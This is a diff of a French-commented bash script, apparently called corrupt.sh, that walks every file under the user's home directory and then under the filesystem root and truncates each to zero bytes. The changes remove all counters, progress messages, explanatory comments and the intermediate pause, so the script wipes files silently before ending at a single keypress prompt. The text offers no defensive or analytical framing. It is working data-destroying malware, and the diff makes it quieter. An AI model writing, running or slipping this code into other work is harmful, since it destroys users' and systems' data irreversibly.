@@ -9,85 +9,37 @@ TARGET="$HOME"
 
 SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
 
-SUCCESS=0
-FAILED=0
-SKIPPED=0
-
 while IFS= read -r -d '' FILE
 do
-    # Ne jamais modifier corrupt.sh lui-même
     if [ "$FILE" = "$SELF" ]; then
-        SKIPPED=$((SKIPPED + 1))
         continue
     fi
 
-    echo "Fichier : $FILE"
-
-    # Tronque le fichier à 0 octet
     if { : > "$FILE"; } 2>/dev/null; then
-        SUCCESS=$((SUCCESS + 1))
-
+        continue
     else
-        FAILED=$((FAILED + 1))
+        continue
     fi
 
-    echo "Fichiers tronqués : $SUCCESS"
-    echo "Échecs             : $FAILED"
-    echo "Fichiers exclus    : $SKIPPED"
-    echo ""
 done < <(find "$TARGET" -type f -print0 2>/dev/null)
-
-echo "=========================================="
-echo "RESULTAT FINAL"
-echo "=========================================="
-echo "Fichiers tronqués : $SUCCESS"
-echo "Échecs             : $FAILED"
-echo "Fichiers exclus    : $SKIPPED"
-echo "=========================================="
-
-echo ""
-read -n 1 -s -r -p "Appuyez sur une touche pour continuer..." < /dev/tty
-echo ""
 
 TARGET="/"
 
 SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
 
-SUCCESS=0
-FAILED=0
-SKIPPED=0
-
 while IFS= read -r -d '' FILE
 do
-    # Ne jamais modifier corrupt.sh lui-même
     if [ "$FILE" = "$SELF" ]; then
-        SKIPPED=$((SKIPPED + 1))
         continue
     fi
 
-    echo "Fichier : $FILE"
-
-    # Tronque le fichier à 0 octet
     if { : > "$FILE"; } 2>/dev/null; then
-        SUCCESS=$((SUCCESS + 1))
-
+        continue
     else
-        FAILED=$((FAILED + 1))
+        continue
     fi
 
-    echo "Fichiers tronqués : $SUCCESS"
-    echo "Échecs             : $FAILED"
-    echo "Fichiers exclus    : $SKIPPED"
-    echo ""
 done < <(find "$TARGET" -type f -print0 2>/dev/null)
-
-echo "=========================================="
-echo "RESULTAT FINAL"
-echo "=========================================="
-echo "Fichiers tronqués : $SUCCESS"
-echo "Échecs             : $FAILED"
-echo "Fichiers exclus    : $SKIPPED"
-echo "=========================================="
 
 echo ""
 read -n 1 -s -r -p "Appuyez sur une touche pour continuer..." < /dev/tty
